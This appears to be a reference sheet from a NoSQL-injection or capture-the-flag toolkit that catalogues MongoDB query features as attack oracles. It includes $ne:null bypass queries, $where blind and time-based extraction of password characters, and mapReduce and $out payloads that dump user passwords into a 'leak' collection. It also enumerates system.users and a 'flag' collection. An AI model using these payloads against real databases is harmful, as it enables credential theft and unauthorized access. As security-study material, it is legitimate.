# MongoDB internals — the BSON/query-engine depth

## The BSON types — the `$type` numbers

```text
1   double          2   string        3   object         4   array
5   binData         6   undefined     7   objectId       8   bool
9   date            10  null          11  regex          12  dbPointer
13  javascript      14  symbol        15  javascriptWithScope
16  int             17  timestamp     18  long           19  decimal
-1  minKey          127 maxKey
```

`{"f": {"$type": 2}}` — `operators.md`.

## The `$type` — the type-check oracle

```json
{"pass": {"$type": "string"}}
{"pass": {"$type": 2}}
{"pass": {"$type": "object"}}
{"pass": {"$type": "array"}}
{"pass": {"$type": ["string", "null"]}}
{"pass": {"$type": "number"}}
{"pass": {"$type": "bool"}}
{"pass": {"$type": "objectId"}}
{"pass": {"$type": "regex"}}
{"pass": {"$type": "javascript"}}
{"pass": {"$type": "javascriptWithScope"}}
{"pass": {"$type": "minKey"}}
{"pass": {"$type": "maxKey"}}
{"pass": {"$type": "missing"}}
{"_id": {"$type": "objectId"}}
{"flag": {"$type": "string"}}
```

`operators.md`.

## The `ObjectId` — the 24-hex

```text
507f1f77bcf86cd799439011
└── timestamp ──┘└─ rand ─┘└ctr┘
  8-hex           10-hex     6-hex
```

```json
{"_id": {"$oid": "507f1f77bcf86cd799439011"}}
{"_id": {"$gt": {"$oid": "507f00000000000000000000"}}}
{"_id": {"$lt": {"$oid": "508000000000000000000000"}}}
{"_id": {"$regex": "^507f"}}
{"_id": {"$regex": "^507f1f77"}}
{"_id": {"$regex": "^[a-f0-9]{24}$"}}
```

The ObjectId — timestamp + rand + counter — `mongo-specific.md`.

## The `findOne`/`find` — the cursor

```javascript
db.users.findOne({user: {$ne: null}})
db.users.find({user: {$ne: null}}).toArray()
db.users.find({user: {$ne: null}}).limit(1)
db.users.find({user: {$ne: null}}).skip(0).limit(1)
```

`findOne` — the first doc; `find` — a cursor — `mongo-specific.md`.

## The `explain` — the plan-oracle

```javascript
db.users.find({user: {$ne: null}}).explain()
db.users.find({user: {$ne: null}}).explain("executionStats")
db.users.explain().find({user: {$ne: null}})
```

`explain` — the plan-stats — `mongo-specific.md`.

## The `count`/`distinct` — the oracle

```javascript
db.users.count({user: {$ne: null}})
db.users.distinct("role", {user: {$ne: null}})
db.users.distinct("pass", {user: "admin"})
```

`count`/`distinct` — `mongo-specific.md`.

## The `mapReduce` — the JS-mapper

```javascript
db.users.mapReduce(
  "function() { emit(this.user, this.pass); }",
  "function(k, v) { return v; }",
  {out: "leak"}
)
```

`mapReduce` — `enableJs` required — `operators-js.md`.

## The `$where` — the JS-filter

```javascript
db.users.find({$where: "this.pass[0] == 'f'"})
db.users.find({$where: "this.pass[0] == 'f' ? sleep(3000) : true"})
db.users.find({user: "admin", $where: "this.pass[0] == 'f'"})
```

`$where` — `operators-js.md`.

## The `aggregate` — the pipeline

```javascript
db.users.aggregate([{"$unionWith": "flag"}])
db.users.aggregate([{"$lookup": {"from": "flag", ...}}])
db.users.aggregate([{"$out": "leak"}])
db.users.aggregate([{"$merge": {"into": "leak"}}])
```

`aggregate` — `aggregation.md`.

## The `eval` — the deprecated JS

```javascript
db.eval("function() { return db.users.findOne(); }")
db.eval("return db.users.findOne()")
```

`db.eval` — REMOVED in MongoDB 4.2 — `operators-js.md`.

## The `serverStatus`/`dbStats` — the meta

```javascript
db.serverStatus()
db.stats()
db.users.stats()
```

`serverStatus`/`dbStats`/`collStats` — `mongo-specific.md`.

## The `runCommand` — the raw-command

```javascript
db.runCommand({usersInfo: 1})
db.runCommand({listCollections: 1})
db.runCommand({listDatabases: 1})
db.runCommand({ping: 1})
db.runCommand({buildInfo: 1})
db.runCommand({collStats: "users"})
db.runCommand({dbStats: 1})
db.runCommand({serverStatus: 1})
db.runCommand({connectionStatus: 1})
db.runCommand({hostInfo: 1})
```

`runCommand` — `mongo-specific.md`.

## The `collection` — the `db.collection()`

```javascript
db.collection("users").find({user: {$ne: null}})
db.collection("flag").find({})
```

`collection` — `mongo-specific.md`.

## The `getCollectionNames` — the enum

```javascript
db.getCollectionNames()
db.getCollectionInfos()
```

`mongo-specific.md`.

## The `system.*` — the meta-collections

```javascript
db.system.users.find()
db.system.roles.find()
db.system.indexes.find()
db.system.profile.find()
db.system.js.find()
db.system.views.find()
```

`system.*` — `mongo-specific.md`.

## The `auth` — the role-check

```javascript
db.runCommand({connectionStatus: 1})
db.runCommand({usersInfo: 1})
```

The role/permission — `denied-conditions.md`.

## The `enableJs` — the JS-capability

```javascript
// mongod.conf
security:
  javascriptEnabled: true
```

`javascriptEnabled` — the `$where`/`$function`/`$accumulator`/`mapReduce`
capability — `operators-js.md`.

## The `$natural` — the disk-order

```javascript
db.users.find().sort({$natural: 1})
db.users.find().sort({$natural: -1})
db.users.find({$natural: 1})
```

`$natural` — `mongo-specific.md`.

## The `hint` — the index-force

```javascript
db.users.find({user: {$ne: null}}).hint({user: 1})
db.users.find({user: {$ne: null}}).hint({$natural: 1})
```

`hint` — `mongo-specific.md`.

## The `collation` — the locale-compare

```javascript
db.users.find({user: "admin"}).collation({locale: "en", strength: 1})
```

`collation` — `mongo-specific.md`.
